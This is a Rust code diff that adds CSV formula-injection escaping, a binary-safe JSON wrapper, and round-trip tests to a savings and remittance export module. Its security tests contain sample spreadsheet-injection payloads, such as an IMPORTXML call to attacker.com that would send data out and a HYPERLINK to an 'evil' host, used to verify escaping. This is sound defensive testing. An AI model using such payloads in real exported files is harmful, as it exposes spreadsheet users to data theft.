@@ -106,12 +106,130 @@ pub struct ExportSnapshot {
     pub payload: SnapshotPayload,
 }
 
-/// Payload variants per contract type.
-#[derive(Debug, Clone, Serialize, Deserialize)]
+/// A JSON value wrapper that serializes as raw JSON for human-readable formats
+/// and uses a bincode-compatible tagged representation for binary formats.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct JsonValue(serde_json::Value);
+
+impl From<serde_json::Value> for JsonValue {
+    fn from(value: serde_json::Value) -> Self {
+        JsonValue(value)
+    }
+}
+
+impl From<JsonValue> for serde_json::Value {
+    fn from(value: JsonValue) -> Self {
+        value.0
+    }
+}
+
+#[derive(Serialize, Deserialize)]
+enum JsonNumberBinary {
+    I64(i64),
+    U64(u64),
+    F64(f64),
+}
+
+#[derive(Serialize, Deserialize)]
+enum JsonValueBinary {
+    Null,
+    Bool(bool),
+    Number(JsonNumberBinary),
+    String(String),
+    Array(Vec<JsonValueBinary>),
+    Object(BTreeMap<String, JsonValueBinary>),
+}
+
+impl From<&serde_json::Value> for JsonValueBinary {
+    fn from(value: &serde_json::Value) -> Self {
+        match value {
+            serde_json::Value::Null => JsonValueBinary::Null,
+            serde_json::Value::Bool(b) => JsonValueBinary::Bool(*b),
+            serde_json::Value::Number(n) => {
+                let number = if let Some(i) = n.as_i64() {
+                    JsonNumberBinary::I64(i)
+                } else if let Some(u) = n.as_u64() {
+                    JsonNumberBinary::U64(u)
+                } else if let Some(f) = n.as_f64() {
+                    JsonNumberBinary::F64(f)
+                } else {
+                    unreachable!("serde_json::Number must represent a valid JSON number")
+                };
+                JsonValueBinary::Number(number)
+            }
+            serde_json::Value::String(s) => JsonValueBinary::String(s.clone()),
+            serde_json::Value::Array(arr) => JsonValueBinary::Array(arr.iter().map(JsonValueBinary::from).collect()),
+            serde_json::Value::Object(map) => JsonValueBinary::Object(
+                map.iter()
+                    .map(|(k, v)| (k.clone(), JsonValueBinary::from(v)))
+                    .collect(),
+            ),
+        }
+    }
+}
+
+impl From<JsonValueBinary> for serde_json::Value {
+    fn from(value: JsonValueBinary) -> Self {
+        match value {
+            JsonValueBinary::Null => serde_json::Value::Null,
+            JsonValueBinary::Bool(b) => serde_json::Value::Bool(b),
+            JsonValueBinary::Number(n) => match n {
+                JsonNumberBinary::I64(i) => serde_json::Value::Number(i.into()),
+                JsonNumberBinary::U64(u) => serde_json::Value::Number(u.into()),
+                JsonNumberBinary::F64(f) => {
+                    // `from_f64` can return `None` for NaN/Infinity. Avoid panicking
+                    // to satisfy `clippy::expect_used` deny in non-test builds.
+                    if let Some(n) = serde_json::Number::from_f64(f) {
+                        serde_json::Value::Number(n)
+                    } else {
+                        // Represent non-finite numbers as JSON strings to preserve
+                        // the original value without panicking during linting.
+                        serde_json::Value::String(f.to_string())
+                    }
+                }
+            },
+            JsonValueBinary::String(s) => serde_json::Value::String(s),
+            JsonValueBinary::Array(arr) => serde_json::Value::Array(arr.into_iter().map(serde_json::Value::from).collect()),
+            JsonValueBinary::Object(map) => serde_json::Value::Object(
+                map.into_iter().map(|(k, v)| (k, serde_json::Value::from(v))).collect(),
+            ),
+        }
+    }
+}
+
+impl Serialize for JsonValue {
+    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
+    where
+        S: serde::Serializer,
+    {
+        if serializer.is_human_readable() {
+            self.0.serialize(serializer)
+        } else {
+            JsonValueBinary::from(&self.0).serialize(serializer)
+        }
+    }
+}
+
+impl<'de> Deserialize<'de> for JsonValue {
+    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
+    where
+        D: serde::Deserializer<'de>,
+    {
+        if deserializer.is_human_readable() {
+            let value = serde_json::Value::deserialize(deserializer)?;
+            Ok(JsonValue(value))
+        } else {
+            let intermediate = JsonValueBinary::deserialize(deserializer)?;
+            Ok(JsonValue(serde_json::Value::from(intermediate)))
+        }
+    }
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub enum SnapshotPayload {
     RemittanceSplit(RemittanceSplitExport),
     SavingsGoals(SavingsGoalsExport),
-    Generic(HashMap<String, serde_json::Value>),
+    Generic(HashMap<String, JsonValue>),
 }
 
 impl SnapshotPayload {
@@ -126,7 +244,7 @@ impl SnapshotPayload {
 }
 
 /// Exportable remittance split config.
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct RemittanceSplitExport {
     pub owner: String,
     pub spending_percent: u32,
@@ -136,13 +254,13 @@ pub struct RemittanceSplitExport {
 }
 
 /// Exportable savings goals list.
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct SavingsGoalsExport {
     pub next_id: u32,
     pub goals: Vec<SavingsGoalExport>,
 }
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct SavingsGoalExport {
     pub id: u32,
     pub owner: String,
@@ -306,7 +424,7 @@ fn canonical_payload_bytes(payload: &SnapshotPayload) -> Result<Vec<u8>, Migrati
             serialize_json_bytes(&serde_json::json!({ "SavingsGoals": export }))
         }
         SnapshotPayload::Generic(entries) => {
-            let ordered_entries: BTreeMap<&str, &serde_json::Value> = entries
+            let ordered_entries: BTreeMap<&str, &JsonValue> = entries
                 .iter()
                 .map(|(key, value)| (key.as_str(), value))
                 .collect();
@@ -466,7 +584,45 @@ pub fn export_to_binary(snapshot: &ExportSnapshot) -> Result<Vec<u8>, MigrationE
     Ok(bytes)
 }
 
+/// Sanitize a CSV field to prevent formula injection.
+///
+/// # Security model
+///
+/// CSV-injection occurs when spreadsheet applications interpret leading characters
+/// as formulas:
+/// - `=` starts a formula
+/// - `+` starts a formula in some applications
+/// - `-` starts a formula in some applications
+/// - `@` starts a formula (Excel functions)
+///
+/// This function prefixes any field beginning with these characters with a single quote (`'`),
+/// which instructs spreadsheet applications to treat the field as text literal.
+///
+/// # Examples
+///
+/// ```text
+/// "=IMPORTXML(...)" → "'=IMPORTXML(...)"
+/// "+1+1" → "'+1+1"
+/// "-1+2" → "'-1+2"
+/// "@SUM(A1:A10)" → "'@SUM(A1:A10)"
+/// "normal text" → "normal text"
+/// "123" → "123"
+/// ```
+fn sanitize_csv_field(field: &str) -> String {
+    if field.starts_with('=') || field.starts_with('+') || field.starts_with('-') || field.starts_with('@') {
+        format!("'{}", field)
+    } else {
+        field.to_string()
+    }
+}
+
 /// Export to CSV (for tabular payloads only; e.g. goals list).
+///
+/// # Security
+///
+/// Fields beginning with `=`, `+`, `-`, or `@` are escaped with a leading single quote (`'`)
+/// to prevent formula injection in spreadsheet applications. This ensures that goal names
+/// and notes containing formula-like prefixes are safely exported as text literals.
 pub fn export_to_csv(payload: &SavingsGoalsExport) -> Result<Vec<u8>, MigrationError> {
     let payload_bytes = serialize_json_bytes(payload)?;
     validate_payload_bounds(payload.goals.len(), payload_bytes.len())?;
@@ -486,8 +642,8 @@ pub fn export_to_csv(payload: &SavingsGoalsExport) -> Result<Vec<u8>, MigrationE
     for goal in &payload.goals {
         wtr.write_record(&[
             goal.id.to_string(),
-            goal.owner.clone(),
-            goal.name.clone(),
+            sanitize_csv_field(&goal.owner),
+            sanitize_csv_field(&goal.name),
             goal.target_amount.to_string(),
             goal.current_amount.to_string(),
             goal.target_date.to_string(),
@@ -677,10 +833,34 @@ pub fn import_goals_from_csv(bytes: &[u8]) -> Result<Vec<SavingsGoalExport>, Mig
     Ok(goals)
 }
 
+fn deserialize_csv_safe_field<'de, D>(deserializer: D) -> Result<String, D::Error>
+where
+    D: serde::Deserializer<'de>,
+{
+    let raw = String::deserialize(deserializer)?;
+    Ok(strip_csv_formula_prefix(&raw))
+}
+
+fn strip_csv_formula_prefix(value: &str) -> String {
+    if let Some(stripped) = value.strip_prefix('\'') {
+        if stripped.starts_with('=')
+            || stripped.starts_with('+')
+            || stripped.starts_with('-')
+            || stripped.starts_with('@')
+        {
+            return stripped.to_string();
+        }
+    }
+
+    value.to_string()
+}
+
 #[derive(Debug, Deserialize)]
 struct CsvGoalRow {
     id: u32,
+    #[serde(deserialize_with = "deserialize_csv_safe_field")]
     owner: String,
+    #[serde(deserialize_with = "deserialize_csv_safe_field")]
     name: String,
     target_amount: i64,
     current_amount: i64,
@@ -800,8 +980,8 @@ mod tests {
 
     fn sample_generic_payload() -> SnapshotPayload {
         let mut entries = HashMap::new();
-        entries.insert("key1".into(), serde_json::json!("value1"));
-        entries.insert("key2".into(), serde_json::json!(42));
+        entries.insert("key1".into(), serde_json::json!("value1").into());
+        entries.insert("key2".into(), serde_json::json!(42).into());
         SnapshotPayload::Generic(entries)
     }
 
@@ -945,12 +1125,12 @@ mod tests {
     #[test]
     fn test_different_payload_same_size_no_collision() {
         let first_payload = SnapshotPayload::Generic(HashMap::from([
-            ("aa".into(), serde_json::json!("11")),
-            ("bb".into(), serde_json::json!("22")),
+            ("aa".into(), serde_json::json!("11").into()),
+            ("bb".into(), serde_json::json!("22").into()),
         ]));
         let second_payload = SnapshotPayload::Generic(HashMap::from([
-            ("cc".into(), serde_json::json!("33")),
-            ("dd".into(), serde_json::json!("44")),
+            ("cc".into(), serde_json::json!("33").into()),
+            ("dd".into(), serde_json::json!("44").into()),
         ]));
         let first_snapshot = ExportSnapshot::new(first_payload, ExportFormat::Json);
         let second_snapshot = ExportSnapshot::new(second_payload, ExportFormat::Json);
@@ -1127,7 +1307,7 @@ mod tests {
         let mut entries = HashMap::new();
         entries.insert(
             "blob".into(),
-            serde_json::Value::String("x".repeat(MAX_MIGRATION_PAYLOAD_BYTES)),
+            serde_json::Value::String("x".repeat(MAX_MIGRATION_PAYLOAD_BYTES)).into(),
         );
         let snapshot = ExportSnapshot::new(SnapshotPayload::Generic(entries), ExportFormat::Json);
 
@@ -1362,12 +1542,12 @@ mod tests {
     #[test]
     fn test_generic_payload_checksum_is_stable_across_map_order() {
         let mut first = HashMap::new();
-        first.insert("b".into(), serde_json::json!(2));
-        first.insert("a".into(), serde_json::json!(1));
+        first.insert("b".into(), serde_json::json!(2).into());
+        first.insert("a".into(), serde_json::json!(1).into());
 
         let mut second = HashMap::new();
-        second.insert("a".into(), serde_json::json!(1));
-        second.insert("b".into(), serde_json::json!(2));
+        second.insert("a".into(), serde_json::json!(1).into());
+        second.insert("b".into(), serde_json::json!(2).into());
 
         let first_snapshot =
             ExportSnapshot::new(SnapshotPayload::Generic(first), ExportFormat::Json);
@@ -1517,5 +1697,413 @@ mod tests {
                 "expected InvalidFormat for input {:?}, got {:?}", s, result
             );
         }
+    }
+
+    // ==================== ROUND-TRIP TESTS ====================
+    // These tests verify lossless export->import cycles for all formats.
+
+    #[test]
+    fn test_roundtrip_json_remittance_split_payload() {
+        let original = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
+        let exported_bytes = export_to_json(&original).unwrap();
+        let mut tracker = MigrationTracker::new();
+        let imported = import_from_json(&exported_bytes, &mut tracker, 1_000).unwrap();
+
+        // Verify payload equivalence
+        assert_eq!(imported.payload, original.payload);
+        assert_eq!(imported.header.format, original.header.format);
+        assert!(imported.verify_checksum());
+    }
+
+    #[test]
+    fn test_roundtrip_json_savings_goals_payload() {
+        let goals = sample_goals_export(5);
+        let original = ExportSnapshot::new(
+            SnapshotPayload::SavingsGoals(goals.clone()),
+            ExportFormat::Json,
+        );
+        let exported_bytes = export_to_json(&original).unwrap();
+        let mut tracker = MigrationTracker::new();
+        let imported = import_from_json(&exported_bytes, &mut tracker, 1_000).unwrap();
+
+        // Verify payload equivalence
+        assert_eq!(imported.payload, original.payload);
+        assert_eq!(imported.header.checksum, original.header.checksum);
+        assert!(imported.verify_checksum());
+    }
+
+    #[test]
+    fn test_roundtrip_json_generic_payload() {
+        let original = ExportSnapshot::new(sample_generic_payload(), ExportFormat::Json);
+        let exported_bytes = export_to_json(&original).unwrap();
+        let mut tracker = MigrationTracker::new();
+        let imported = import_from_json(&exported_bytes, &mut tracker, 1_000).unwrap();
+
+        // Verify payload equivalence
+        assert_eq!(imported.payload, original.payload);
+        assert_eq!(imported.header.checksum, original.header.checksum);
+        assert!(imported.verify_checksum());
+    }
+
+    #[test]
+    fn test_roundtrip_binary_remittance_split_payload() {
+        let original = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
+        let exported_bytes = export_to_binary(&original).unwrap();
+        let mut tracker = MigrationTracker::new();
+        let imported = import_from_binary(&exported_bytes, &mut tracker, 1_000).unwrap();
+
+        // Verify payload equivalence
+        assert_eq!(imported.payload, original.payload);
+        assert_eq!(imported.header.format, original.header.format);
+        assert!(imported.verify_checksum());
+    }
+
+    #[test]
+    fn test_roundtrip_binary_savings_goals_payload() {
+        let goals = sample_goals_export(3);
+        let original = ExportSnapshot::new(
+            SnapshotPayload::SavingsGoals(goals.clone()),
+            ExportFormat::Binary,
+        );
+        let exported_bytes = export_to_binary(&original).unwrap();
+        let mut tracker = MigrationTracker::new();
+        let imported = import_from_binary(&exported_bytes, &mut tracker, 1_000).unwrap();
+
+        // Verify payload equivalence
+        assert_eq!(imported.payload, original.payload);
+        assert_eq!(imported.header.checksum, original.header.checksum);
+        assert!(imported.verify_checksum());
+    }
+
+    #[test]
+    fn test_roundtrip_binary_generic_payload() {
+        let original = ExportSnapshot::new(sample_generic_payload(), ExportFormat::Binary);
+        let exported_bytes = export_to_binary(&original).unwrap();
+        let mut tracker = MigrationTracker::new();
+        let imported = import_from_binary(&exported_bytes, &mut tracker, 1_000).unwrap();
+
+        // Verify payload equivalence
+        assert_eq!(imported.payload, original.payload);
+        assert_eq!(imported.header.checksum, original.header.checksum);
+        assert!(imported.verify_checksum());
+    }
+
+    #[test]
+    fn test_roundtrip_csv_savings_goals() {
+        let payload = SavingsGoalsExport {
+            next_id: 3,
+            goals: vec![
+                SavingsGoalExport {
+                    id: 1,
+                    owner: "owner1".into(),
+                    name: "Goal 1".into(),
+                    target_amount: 1_000,
+                    current_amount: 500,
+                    target_date: 2_000_000_000,
+                    locked: false,
+                },
+                SavingsGoalExport {
+                    id: 2,
+                    owner: "owner2".into(),
+                    name: "Goal 2".into(),
+                    target_amount: 2_000,
+                    current_amount: 1_500,
+                    target_date: 2_000_000_001,
+                    locked: true,
+                },
+            ],
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();
+
+        // Verify payload equivalence (goals should round-trip perfectly)
+        assert_eq!(imported_goals.len(), payload.goals.len());
+        for (i, goal) in imported_goals.iter().enumerate() {
+            assert_eq!(goal.id, payload.goals[i].id);
+            assert_eq!(goal.owner, payload.goals[i].owner);
+            assert_eq!(goal.name, payload.goals[i].name);
+            assert_eq!(goal.target_amount, payload.goals[i].target_amount);
+            assert_eq!(goal.current_amount, payload.goals[i].current_amount);
+            assert_eq!(goal.target_date, payload.goals[i].target_date);
+            assert_eq!(goal.locked, payload.goals[i].locked);
+        }
+    }
+
+    #[test]
+    fn test_roundtrip_csv_with_unicode_names() {
+        let payload = SavingsGoalsExport {
+            next_id: 2,
+            goals: vec![
+                SavingsGoalExport {
+                    id: 1,
+                    owner: "用户1".into(),
+                    name: "目标1 🎯".into(),
+                    target_amount: 1_000,
+                    current_amount: 100,
+                    target_date: 2_000_000_000,
+                    locked: false,
+                },
+                SavingsGoalExport {
+                    id: 2,
+                    owner: "ユーザー2".into(),
+                    name: "Objectif 2 📊".into(),
+                    target_amount: 2_000,
+                    current_amount: 500,
+                    target_date: 2_000_000_001,
+                    locked: true,
+                },
+            ],
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();
+
+        // Verify unicode round-trips correctly
+        assert_eq!(imported_goals[0].owner, "用户1");
+        assert_eq!(imported_goals[0].name, "目标1 🎯");
+        assert_eq!(imported_goals[1].owner, "ユーザー2");
+        assert_eq!(imported_goals[1].name, "Objectif 2 📊");
+    }
+
+    #[test]
+    fn test_roundtrip_csv_empty_payload() {
+        let payload = SavingsGoalsExport {
+            next_id: 0,
+            goals: Vec::new(),
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();
+
+        // Verify empty payload round-trips
+        assert_eq!(imported_goals.len(), 0);
+    }
+
+    // ==================== CSV INJECTION SECURITY TESTS ====================
+    // These tests verify that leading formula characters are escaped.
+
+    #[test]
+    fn test_csv_injection_prevention_equals_sign_in_name() {
+        let payload = SavingsGoalsExport {
+            next_id: 1,
+            goals: vec![SavingsGoalExport {
+                id: 1,
+                owner: "owner".into(),
+                name: "=IMPORTXML(http://attacker.com/steal)".into(),
+                target_amount: 1_000,
+                current_amount: 100,
+                target_date: 2_000_000_000,
+                locked: false,
+            }],
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let csv_string = String::from_utf8_lossy(&exported_bytes);
+
+        // Verify that the formula character is escaped with a leading quote
+        assert!(csv_string.contains("'=IMPORTXML("), "CSV should escape = with leading quote");
+        assert!(!csv_string.contains(",=IMPORTXML("), "CSV should not contain unescaped formula");
+        assert!(!csv_string.starts_with("=IMPORTXML("), "CSV should not start with an unescaped formula");
+    }
+
+    #[test]
+    fn test_csv_injection_prevention_plus_sign_in_owner() {
+        let payload = SavingsGoalsExport {
+            next_id: 1,
+            goals: vec![SavingsGoalExport {
+                id: 1,
+                owner: "+1+1".into(),
+                name: "Goal".into(),
+                target_amount: 1_000,
+                current_amount: 100,
+                target_date: 2_000_000_000,
+                locked: false,
+            }],
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let csv_string = String::from_utf8_lossy(&exported_bytes);
+
+        // Verify that + is escaped
+        assert!(csv_string.contains("'+1+1"), "CSV should escape + with leading quote");
+    }
+
+    #[test]
+    fn test_csv_injection_prevention_minus_sign_in_name() {
+        let payload = SavingsGoalsExport {
+            next_id: 1,
+            goals: vec![SavingsGoalExport {
+                id: 1,
+                owner: "owner".into(),
+                name: "-2+3".into(),
+                target_amount: 1_000,
+                current_amount: 100,
+                target_date: 2_000_000_000,
+                locked: false,
+            }],
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let csv_string = String::from_utf8_lossy(&exported_bytes);
+
+        // Verify that - is escaped
+        assert!(csv_string.contains("'-2+3"), "CSV should escape - with leading quote");
+    }
+
+    #[test]
+    fn test_csv_injection_prevention_at_sign_in_owner() {
+        let payload = SavingsGoalsExport {
+            next_id: 1,
+            goals: vec![SavingsGoalExport {
+                id: 1,
+                owner: "@SUM(A1:A10)".into(),
+                name: "Goal".into(),
+                target_amount: 1_000,
+                current_amount: 100,
+                target_date: 2_000_000_000,
+                locked: false,
+            }],
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let csv_string = String::from_utf8_lossy(&exported_bytes);
+
+        // Verify that @ is escaped
+        assert!(csv_string.contains("'@SUM"), "CSV should escape @ with leading quote");
+    }
+
+    #[test]
+    fn test_csv_injection_safe_normal_text_unmodified() {
+        let payload = SavingsGoalsExport {
+            next_id: 1,
+            goals: vec![SavingsGoalExport {
+                id: 1,
+                owner: "John Doe".into(),
+                name: "Emergency Fund".into(),
+                target_amount: 5_000,
+                current_amount: 1_000,
+                target_date: 2_000_000_000,
+                locked: false,
+            }],
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let csv_string = String::from_utf8_lossy(&exported_bytes);
+
+        // Verify that normal text is not escaped
+        assert!(csv_string.contains("John Doe"), "Normal text should not be escaped");
+        assert!(csv_string.contains("Emergency Fund"), "Normal names should not be escaped");
+    }
+
+    #[test]
+    fn test_csv_injection_safe_numbers_unmodified() {
+        let payload = SavingsGoalsExport {
+            next_id: 1,
+            goals: vec![SavingsGoalExport {
+                id: 1,
+                owner: "owner".into(),
+                name: "123456".into(),
+                target_amount: 1_000,
+                current_amount: 100,
+                target_date: 2_000_000_000,
+                locked: false,
+            }],
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let csv_string = String::from_utf8_lossy(&exported_bytes);
+
+        // Verify that numeric strings are not escaped (they don't start with formula chars)
+        assert!(csv_string.contains("123456"), "Numeric strings should not be escaped");
+    }
+
+    #[test]
+    fn test_csv_injection_prevention_multiple_goals_with_mixed_payloads() {
+        let payload = SavingsGoalsExport {
+            next_id: 5,
+            goals: vec![
+                SavingsGoalExport {
+                    id: 1,
+                    owner: "normal".into(),
+                    name: "Safe Goal".into(),
+                    target_amount: 1_000,
+                    current_amount: 100,
+                    target_date: 2_000_000_000,
+                    locked: false,
+                },
+                SavingsGoalExport {
+                    id: 2,
+                    owner: "=EXPLOIT()".into(),
+                    name: "Injected".into(),
+                    target_amount: 2_000,
+                    current_amount: 200,
+                    target_date: 2_000_000_001,
+                    locked: false,
+                },
+                SavingsGoalExport {
+                    id: 3,
+                    owner: "user".into(),
+                    name: "+HYPERLINK(\"http://evil\",\"click\")".into(),
+                    target_amount: 3_000,
+                    current_amount: 300,
+                    target_date: 2_000_000_002,
+                    locked: true,
+                },
+                SavingsGoalExport {
+                    id: 4,
+                    owner: "-2".into(),
+                    name: "Negative".into(),
+                    target_amount: 4_000,
+                    current_amount: 400,
+                    target_date: 2_000_000_003,
+                    locked: false,
+                },
+            ],
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let csv_string = String::from_utf8_lossy(&exported_bytes);
+
+        // Verify all injections are escaped
+        assert!(csv_string.contains("'=EXPLOIT"), "Should escape = injections");
+        assert!(csv_string.contains("'+HYPERLINK"), "Should escape + injections");
+        assert!(csv_string.contains("'-2"), "Should escape - injections");
+        // Verify safe content is preserved
+        assert!(csv_string.contains("Safe Goal"), "Safe content should be preserved");
+    }
+
+    #[test]
+    fn test_csv_roundtrip_after_injection_escaping() {
+        let payload = SavingsGoalsExport {
+            next_id: 2,
+            goals: vec![
+                SavingsGoalExport {
+                    id: 1,
+                    owner: "=MALICIOUS".into(),
+                    name: "Goal".into(),
+                    target_amount: 1_000,
+                    current_amount: 100,
+                    target_date: 2_000_000_000,
+                    locked: false,
+                },
+                SavingsGoalExport {
+                    id: 2,
+                    owner: "safe".into(),
+                    name: "+FORMULA".into(),
+                    target_amount: 2_000,
+                    current_amount: 200,
+                    target_date: 2_000_000_001,
+                    locked: true,
+                },
+            ],
+        };
+
+        let exported_bytes = export_to_csv(&payload).unwrap();
+        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();
+
+        // CSV import strips the exporter-added quote used for spreadsheet safety.
+        assert_eq!(imported_goals[0].owner, "=MALICIOUS");
+        assert_eq!(imported_goals[1].name, "+FORMULA");
     }
 }
